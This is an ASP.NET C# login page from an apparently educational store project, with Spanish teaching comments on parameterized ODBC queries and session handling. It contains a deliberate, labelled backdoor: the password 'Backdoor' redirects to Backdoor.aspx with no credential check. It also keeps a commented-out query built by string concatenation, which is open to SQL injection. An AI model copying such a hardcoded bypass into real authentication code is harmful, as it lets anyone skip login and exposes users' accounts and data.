using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
//si voy a usar la base de datos, hay que importar odbc
using System.Data.Odbc;

namespace Tienda012020
{
    public partial class login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void Button1_Click(object sender, EventArgs e)
        {
            //parametros del query
            String correo = TextBox1.Text;
            String passwd = TextBox2.Text;

            //Backdoor
            if (TextBox2.Text == "Backdoor")
            {
                Response.Redirect("Backdoor.aspx");
            }
            //Backdoor

            //Signos ? siginifican que hay que sustituir por un parametro
            String query = "select nombre from cliente where correo=? and passwd=?";
            //String query = "select nombre from cliente where correo='" + correo + "' and passwd='" + passwd + "'";
            //Crear conexion a base de datos
            ConexionBD objetoParaConexion = new ConexionBD(); //<-- este objeto es el que tiene la conexion
            OdbcConnection conexion = objetoParaConexion.con; //<-- acceder a la conexion de clase ConexionBD
            //Crear el comando, el comando ejecuta el query en la base de datos
            //El comando siempre necesita un query y una conexion abierta
            OdbcCommand comando = new OdbcCommand(query, conexion);
            //pasar parámetros al comando, tienen que pasarse en orden como estan en el query
            comando.Parameters.AddWithValue("correo", correo);
            comando.Parameters.AddWithValue("passwd", passwd);
            //Ejecutar el comando
            OdbcDataReader lector = comando.ExecuteReader(); //<-- executeReader regresa una tabla
                                                             //y hay que recibirla con un lector
            //Verificar si el comando regreso algun renglon
            if (lector.HasRows == true)
            {
                //como iterar el lector para un renglon
                //para mover el lector al primer renglon
                lector.Read(); //<-- regresa true si hay un siguiente renglon
                               //false si no hay más renglones para leer 
                //Debo saber el tipo de datos que estoy leyendo
                String nombre = lector.GetString(0); //0 indica el numero de columna que quiero leer

                //El usuario puso bien sus credenciales, hay que dejarlo entrar al sitio
                //Variable de sesion para validar que el usuario puso bien sus credenciales
                //Todas las paginas del proyecto pueden acceder a las variables de sesion
                Session["nombreUsuario"] = nombre;
                Session["correoUsuario"] = correo;//<-- para usarlo en la pagina tienda
                //Puedo elegir un timeout para mi sesion en minutos
                Session.Timeout = 15;
                Response.Redirect("Tienda.aspx");
            }
            else
            {
                Label1.Text = "Credenciales incorrectas";
                //Borra las variables de sesion... efectivamente cierra la sesion
                Session.Abandon();
            }
        }
    }
}